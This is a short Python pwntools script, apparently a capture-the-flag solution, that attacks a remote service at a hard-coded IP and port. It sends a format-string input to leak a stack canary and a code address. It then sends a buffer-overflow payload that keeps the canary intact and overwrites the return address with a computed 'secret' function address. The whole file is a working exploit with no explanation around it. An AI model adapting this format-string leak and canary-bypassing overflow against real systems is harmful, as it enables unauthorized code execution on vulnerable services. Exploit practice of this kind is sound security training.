from pwn import *
import re

io = remote("212.2.250.33", 31271)

io.recvuntil(b"Greeting format: ")
io.sendline(b"%9$p %11$p")
data = io.recvuntil(b"Your name: ")
print(data.decode())

vals = re.findall(rb'0x[0-9a-fA-F]+', data)
canary = int(vals[0], 16)
leak = int(vals[1], 16)

secret = leak - 0xf0
payload = b"A"*72 + p64(canary) + b"B"*8 + p64(secret)

io.sendline(payload)
print(io.recvall(timeout=2).decode(errors="ignore"))